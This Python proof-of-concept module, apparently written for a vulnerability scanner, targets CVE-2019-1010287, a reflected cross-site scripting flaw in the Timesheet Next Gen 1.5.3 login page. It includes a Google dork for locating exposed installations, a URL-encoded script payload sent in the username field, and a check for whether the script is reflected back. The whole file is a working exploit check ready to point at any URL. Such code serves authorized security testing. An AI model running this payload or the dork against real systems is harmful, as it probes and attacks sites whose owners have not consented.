import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Timesheet 1.5.3 - Cross Site Scripting''',
        "description": '''Timesheet Next Gen 1.5.3 and earlier is affected by: Cross Site Scripting (XSS). The impact is: Allows an attacker to execute arbitrary HTML and JavaScript code via a "redirect" parameter. The component is: Web login form: login.php, lines 40 and 54. The attack vector is: reflected XSS, victim may click the malicious url.''',
        "severity": "medium",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1010287", 
            "http://www.mdh-tz.info/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2019-1010287",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            "google-dork":'''inurl:"/timesheet/login.php"'''
        },
        "tags": ["cve", "cve2019", "timesheet", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/timesheet/login.php"""
        method = "POST"
        data = """username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""><script>javascript:alert(document.domain)</script>""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url